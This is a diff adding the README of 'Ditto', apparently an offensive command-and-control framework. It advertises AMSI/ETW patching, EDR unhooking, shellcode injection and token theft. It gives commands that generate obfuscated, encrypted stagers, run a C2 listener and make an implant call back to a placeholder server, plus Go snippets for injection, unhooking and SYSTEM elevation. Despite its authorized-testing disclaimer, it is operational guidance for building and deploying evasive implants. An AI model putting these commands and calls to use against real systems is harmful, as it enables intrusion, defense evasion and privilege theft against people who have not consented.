@@ -1,0 +1,360 @@
+# Ditto 🎭
+
+<div align="center">
+
+![Ditto Logo](ditto.png)
+
+**Advanced Security Testing Framework**
+
+*A production-ready red team framework with advanced evasion techniques, C2 capabilities, and comprehensive module support*
+
+[![Go Version](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org/)
+[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)](https://github.com/rxid09672/ditto)
+
+</div>
+
+---
+
+## ⚠️ DISCLAIMER
+
+**THIS SOFTWARE IS FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.**
+
+Unauthorized use of this software is illegal and may result in criminal prosecution. Use only on systems you own or have explicit written permission to test. Always comply with applicable laws and regulations in your jurisdiction.
+
+---
+
+## 🚀 Features
+
+### Advanced Evasion Techniques
+- ✅ **Direct Syscall Unhooking** - Runtime syscall detection, bypasses userland hooks
+- ✅ **ETW/AMSI Patching** - Blinds Windows telemetry and script scanning
+- ✅ **PE Unhooking** - Complete DLL refresh from disk to remove hooks
+- ✅ **Hardware Breakpoint Detection** - Detects debuggers
+- ✅ **String Obfuscation** - Runtime encryption/decryption
+- ✅ **Sleep Masking** - Evades timing analysis
+- ✅ **EDR Unhooking** - Comprehensive unhooking suite
+
+### Process Injection & Execution
+- ✅ **Direct Syscall Injection** - Unhooked process injection
+- ✅ **Multiple Methods** - CreateRemoteThread, NtCreateThreadEx, QueueUserAPC
+- ✅ **Process Migration** - Complete with shellcode extraction
+- ✅ **Cross-Platform** - Windows, Linux, macOS support
+
+### Privilege Escalation
+- ✅ **GetSystem** - SYSTEM elevation
+- ✅ **Token Manipulation** - Impersonation and token theft
+- ✅ **MakeToken** - Credential-based token creation
+
+### C2 Capabilities
+- ✅ **HTTP/HTTPS Transport** - Encrypted communication
+- ✅ **mTLS Transport** - Mutual TLS authentication
+- ✅ **Session Management** - Beacon and interactive sessions
+- ✅ **Multi-Transport** - Support for multiple protocols
+
+### Module System
+- ✅ **400+ Empire Modules** - Full PowerShell, Python, C#, BOF support
+- ✅ **YAML Configuration** - Easy module definition
+- ✅ **Custom Handlers** - Complex module generation logic
+- ✅ **Dynamic Loading** - Runtime module execution
+
+### Interactive CLI
+- ✅ **Beautiful Welcome Screen** - ditto.png ASCII art banner
+- ✅ **Interactive Commands** - Easy-to-use CLI interface
+- ✅ **Payload Generation** - Quick payload creation
+- ✅ **Server Management** - Built-in C2 server
+
+---
+
+## 📦 Installation
+
+### Prerequisites
+- Go 1.24 or later
+- Git
+
+### Build from Source
+
+```bash
+# Clone the repository
+git clone https://github.com/rxid09672/ditto.git
+cd ditto
+
+# Build binary
+make build
+
+# Or use go directly
+go build -o bin/ditto .
+```
+
+### Cross-Compilation
+
+```bash
+# Build for Windows
+make build-windows
+
+# Build for Linux
+make build-linux
+
+# Build for macOS
+make build-darwin
+
+# Build for all platforms
+make build-all
+```
+
+---
+
+## 🎯 Quick Start
+
+### Interactive Mode (Recommended)
+
+```bash
+# Start interactive CLI
+./bin/ditto
+
+# You'll see the ditto.png banner and interactive prompt
+[ditto] > help
+[ditto] > generate stager windows amd64 payload.exe
+[ditto] > server 0.0.0.0:8443
+[ditto] > exit
+```
+
+### Command Line Mode
+
+```bash
+# Generate a payload
+./bin/ditto --mode generate \
+    --payload stager \
+    --os windows \
+    --arch amd64 \
+    --output payload.exe \
+    --encrypt \
+    --obfuscate
+
+# Start C2 server
+./bin/ditto --mode server --listen 0.0.0.0:8443
+
+# Connect as client
+./bin/ditto --mode client --callback https://your-server.com:8443
+```
+
+### Available Commands
+
+| Command | Description |
+|---------|-------------|
+| `generate` | Generate payloads (stager, shellcode, or full) |
+| `server` | Start C2 server |
+| `client` | Connect as client to C2 server |
+| `help` | Show help message |
+| `version` | Show version information |
+| `clear` | Clear screen |
+
+---
+
+## 📖 Usage Examples
+
+### Generate Windows Stager
+
+```bash
+./bin/ditto --mode generate \
+    --payload stager \
+    --os windows \
+    --arch amd64 \
+    --output windows_stager.exe \
+    --encrypt \
+    --obfuscate
+```
+
+### Generate Linux Shellcode
+
+```bash
+./bin/ditto --mode generate \
+    --payload shellcode \
+    --os linux \
+    --arch amd64 \
+    --output linux_shellcode.bin
+```
+
+### Start Server with Debug
+
+```bash
+./bin/ditto --mode server \
+    --listen 0.0.0.0:8443 \
+    --debug
+```
+
+### Interactive Mode Examples
+
+```bash
+# Start interactive CLI
+./bin/ditto
+
+# Generate payload
+[ditto] > generate stager windows amd64 payload.exe
+
+# Start server on custom port
+[ditto] > server 0.0.0.0:8080
+
+# Connect to server
+[ditto] > client https://server.com:8443
+
+# Show help
+[ditto] > help
+
+# Exit
+[ditto] > exit
+```
+
+---
+
+## 🏗️ Architecture
+
+```
+ditto/
+├── banner/              # ASCII art banner system
+├── core/                # Core functionality (config, logger, session)
+├── crypto/              # Encryption (AES-256, ChaCha20)
+├── evasion/             # Evasion techniques
+│   ├── syscall_detection.go
+│   ├── windows.go
+│   ├── indirect_syscalls.go
+│   └── callstack_spoofing.go
+├── injection/           # Process injection
+├── privilege/           # Privilege escalation
+├── transport/           # C2 transports (HTTP, mTLS)
+├── payload/             # Payload generation
+├── modules/             # Module system (400+ Empire modules)
+├── main.go              # Main entry point
+└── interactive.go       # Interactive CLI client
+```
+
+---
+
+## 🔧 Advanced Features
+
+### Direct Syscall Unhooking
+
+```go
+ds := evasion.NewDirectSyscall(logger)
+r1, r2, err := ds.Call("NtAllocateVirtualMemory", args...)
+```
+
+### Process Injection with Direct Syscalls
+
+```go
+pi, ds, err := evasion.NewProcessInjectionWithEvasion(logger)
+err = pi.InjectShellcode(pid, shellcode, "ntcreatethreadex")
+```
+
+### EDR Unhooking
+
+```go
+successCount := evasion.UnhookEDR()
+// Returns number of successful unhook operations (0-5)
+```
+
+### Privilege Escalation
+
+```go
+pe := privilege.NewPrivilegeEscalation(logger)
+err := pe.GetSystem("winlogon.exe")
+err := pe.ImpersonateUser("username")
+err := pe.MakeToken("user", "domain", "password")
+```
+
+---
+
+## 📚 Documentation
+
+- [CLI Usage Guide](CLI_USAGE.md) - Complete CLI reference
+- [Production Ready Status](PRODUCTION_READY_COMPLETE.md) - Feature implementation status
+- [Evasion & Sliver Implementation](EVASION_AND_SLIVER_IMPLEMENTATION_COMPLETE.md) - Technical details
+
+---
+
+## 🛠️ Development
+
+### Project Structure
+
+```
+ditto/
+├── banner/          # Banner system
+├── core/            # Core components
+├── crypto/          # Cryptography
+├── evasion/         # Evasion techniques
+├── injection/       # Process injection
+├── modules/         # Module system
+├── payload/         # Payload generation
+├── privilege/       # Privilege escalation
+├── transport/       # C2 transports
+└── Makefile         # Build system
+```
+
+### Building
+
+```bash
+# Development build
+make build
+
+# Production build with version info
+go build -ldflags "-X main.buildTime=$(date -u +%Y-%m-%dT%H:%M:%SZ) -X main.gitCommit=$(git rev-parse --short HEAD)" -o bin/ditto .
+```
+
+### Testing
+
+```bash
+make test
+```
+
+---
+
+## 📋 Requirements
+
+- **Go**: 1.24 or later
+- **Platform**: Windows, Linux, or macOS
+- **Permissions**: Administrator/root for some features
+
+---
+
+## 🔒 Security
+
+- All payloads are encrypted by default
+- Code obfuscation available
+- Secure communication via TLS/mTLS
+- Authorization checks built-in
+
+---
+
+## 📝 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome! Please feel free to submit a Pull Request.
+
+---
+
+## 🙏 Acknowledgments
+
+- Inspired by [Sliver](https://github.com/BishopFox/sliver) C2 framework
+- Module system based on [Empire](https://github.com/BC-SECURITY/Empire)
+- Evasion techniques from various security research
+
+---
+
+## 📞 Support
+
+For issues, questions, or contributions, please open an issue on [GitHub](https://github.com/rxid09672/ditto/issues).
+
+---
+
+<div align="center">
+
+**Made with ❤️ for authorized security testing**
+
+⚠️ **USE RESPONSIBLY** ⚠️
+
+</div>
